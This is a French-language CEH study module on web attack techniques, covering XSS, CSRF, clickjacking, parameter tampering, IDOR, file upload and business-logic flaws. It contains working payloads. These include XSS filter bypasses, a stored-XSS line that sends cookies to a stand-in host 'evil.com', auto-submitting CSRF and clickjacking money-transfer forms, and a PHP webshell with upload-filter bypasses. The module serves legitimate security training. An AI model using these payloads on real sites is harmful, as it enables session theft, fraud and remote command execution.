# 🔴 Module 14 — Techniques d'Attaques Web

> **CEH v13 | EC-Council**  
> `#XSS` `#CSRF` `#Clickjacking` `#IDOR` `#FileUpload` `#BusinessLogic`

---

## 📌 Table des matières

1. [XSS — Cross-Site Scripting](#1-xss)
2. [CSRF — Cross-Site Request Forgery](#2-csrf)
3. [Clickjacking](#3-clickjacking)
4. [Parameter Tampering](#4-parameter-tampering)
5. [IDOR — Insecure Direct Object Reference](#5-idor)
6. [File Upload Vulnerabilities](#6-file-upload)
7. [Business Logic Flaws](#7-business-logic)

---

## 1. XSS — Cross-Site Scripting

### 1.1 XSS Réfléchi (Reflected)

```
Le payload est dans l'URL et immédiatement retourné dans la réponse.

URL malveillante :
https://site.com/search?q=<script>alert(document.cookie)</script>

Si non filtré, le HTML généré contient :
<p>Résultats pour : <script>alert(document.cookie)</script></p>
→ Le navigateur exécute le JavaScript !

Payloads avancés (bypass de filtre) :
<ScRiPt>alert(1)</ScRiPt>                      ← Case variation
<img src=x onerror=alert(1)>                   ← Event handler
<svg/onload=alert(1)>                          ← SVG
<body onload=alert(1)>                         ← Body event
"><script>alert(1)</script>                    ← Fermer une balise
'><script>alert(1)</script>                    ← Single quote
```

### 1.2 XSS Stocké (Stored / Persistent)

```
Le payload est stocké en DB et exécuté pour chaque visiteur.

Exemple — Forum vulnérable :
POST /forum/post HTTP/1.1
message=Bonjour !<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>

→ Chaque visiteur de la page enverra son cookie à evil.com
→ Persistant = plus dangereux que le reflected
```

### 1.3 XSS DOM-based

```
Le payload manipule le DOM côté client, sans passer par le serveur.

Code JavaScript vulnérable :
document.getElementById('welcome').innerHTML = location.hash.substring(1);

URL malveillante :
https://site.com/page#<img src=x onerror=alert(1)>
→ Le JS côté client insère directement le hash dans le DOM
→ Le serveur ne voit jamais le payload !
```

---

## 2. CSRF — Cross-Site Request Forgery

```
Scénario bancaire :

1. Alice est connectée sur bank.com (Cookie: session=alice_valid_session)

2. Attaquant envoie un email avec ce code HTML :
   <html>
     <body onload="document.forms[0].submit()">
       <form action="https://bank.com/transfer" method="POST">
         <input type="hidden" name="to" value="attacker_account">
         <input type="hidden" name="amount" value="1000">
       </form>
     </body>
   </html>

3. Alice ouvre l'email → le formulaire se soumet automatiquement
   Requête envoyée : POST https://bank.com/transfer
   Cookie: session=alice_valid_session  ← Auto-inclus par le navigateur !
   to=attacker_account&amount=1000

4. bank.com croit que c'est Alice qui transfère !
```

**Test CSRF :**
- Utiliser Burp Suite → intercepter la requête sensible
- Générer un "CSRF PoC" automatiquement (Burp Suite → Engagement Tools)
- Vérifier si token CSRF présent et validé côté serveur

---

## 3. Clickjacking

```
Principe : Superposer une iframe invisible sur un bouton légitime.

<style>
  iframe {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.01;  ← Invisible !
    z-index: 999;
  }
</style>

<div>Cliquez ici pour gagner un cadeau !</div>
<iframe src="https://bank.com/transfer?to=attacker&amount=1000"></iframe>
                ↑ Invisible, superposé au bouton "cadeau"
                
→ L'utilisateur croit cliquer sur "cadeau" mais clique sur "Transférer" !
```

**Protection :** Header `X-Frame-Options: SAMEORIGIN` ou CSP `frame-ancestors 'self'`

---

## 4. Parameter Tampering

### Hidden Field Manipulation

```html
Formulaire de commande vulnérable :
<form action="/checkout">
  <input type="hidden" name="price" value="99.99">  ← Modifiable !
  <input type="hidden" name="productId" value="123">
  <button>Acheter</button>
</form>

Avec Burp Suite, modifier avant envoi :
price=0.01  ← Acheter à 1 centime !
```

### URL Parameter Tampering

```
Lien de confirmation de commande :
https://site.com/confirm?order_id=1001&user_id=42&discount=0

Modifier :
https://site.com/confirm?order_id=1001&user_id=42&discount=100

→ Si côté serveur pas de validation → réduction de 100% !
```

---

## 5. IDOR — Insecure Direct Object Reference

```
Principe : Accéder directement à des objets en manipulant les identifiants.

API REST vulnérable :
GET /api/v1/users/1001/documents/5              ← Mon document
→ Modifier en : GET /api/v1/users/1002/documents/5  ← Document de quelqu'un d'autre

Cas pratiques :
GET  /download?file=invoice_alice.pdf           ← Mes factures
→    /download?file=invoice_bob.pdf            ← Factures de Bob !

GET  /api/messages?conversation_id=987
→    /api/messages?conversation_id=988         ← Messages d'un autre !

Test avec Burp Suite Intruder :
Fuzz le paramètre ID de 1 à 1000
→ Comparer les tailles de réponses pour identifier les ressources accessibles
```

---

## 6. File Upload Vulnerabilities

```
Application avec upload d'avatar vulnérable :

Test 1 — Upload d'un webshell PHP :
shell.php :
<?php system($_GET["cmd"]); ?>

POST /upload HTTP/1.1
Content-Type: multipart/form-data

file=shell.php (content: <?php system($_GET["cmd"]); ?>)

→ Si stocké dans le webroot et exécuté par le serveur :
https://site.com/uploads/shell.php?cmd=whoami → www-data

Test 2 — Bypass du filtre par extension :
shell.php5     ← Extensions PHP alternatives
shell.phtml
shell.pHp      ← Case variation
shell.php.jpg  ← Double extension (IIS vulnérable)

Test 3 — Bypass du filtre MIME type (Burp Suite) :
Content-Type: image/jpeg   ← Mentir sur le type MIME
(mais contenu = PHP)

Test 4 — Fichier SVG (XSS stored) :
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
→ Upload d'une "image" SVG qui exécute du JavaScript !
```

---

## 7. Business Logic Flaws

```
Vulnérabilités dans la logique métier qui ne correspondent pas à des injections classiques.

Exemple 1 — Race condition :
Processus : Vérifier solde (100€) → Débiter 100€
Race condition : Envoyer 2 requêtes simultanées
  Thread 1 : vérification = 100€ ✓ → en attente de débiter
  Thread 2 : vérification = 100€ ✓ → en attente de débiter
  Thread 1 : débite 100€  (solde = 0€)
  Thread 2 : débite 100€  (solde = -100€ !)
→ Avoir négatif ou achat double pour le prix d'un !

Exemple 2 — Quantité négative :
POST /cart/add
product_id=123&quantity=-5
→ Si non validé → crédit sur le compte !

Exemple 3 — Contournement de workflow :
/checkout/step1 → /checkout/step2 → /checkout/payment → /checkout/confirm

Skip direct :
GET /checkout/confirm?order_id=new
→ Si pas de validation d'état → commande sans paiement !

Exemple 4 — Coupon usage illimité :
Code promo "SAVE10" utilisable une seule fois par utilisateur.
Race condition : 2 requêtes simultanées → 2 utilisations !
```

---

## 🧠 Points clés à retenir pour l'examen

- **XSS types** : Reflected (URL), Stored (DB), DOM-based (côté client)
- **XSS Stored** = plus dangereux (affecte tous les visiteurs)
- **CSRF** = forger une requête depuis le navigateur authentifié
- **Clickjacking** = iframe invisible → protection : `X-Frame-Options`
- **IDOR** = A01 OWASP, manipulation d'identifiants pour accéder à d'autres ressources
- **File upload** → webshell → vérifier si exécutable depuis webroot
- **Business logic** = vulnérabilités de workflow et logique métier

---

*⬅️ [OWASP Top 10](./02_owasp_top10.md) | ➡️ [Outils et Labs](./04_outils_et_labs.md)*
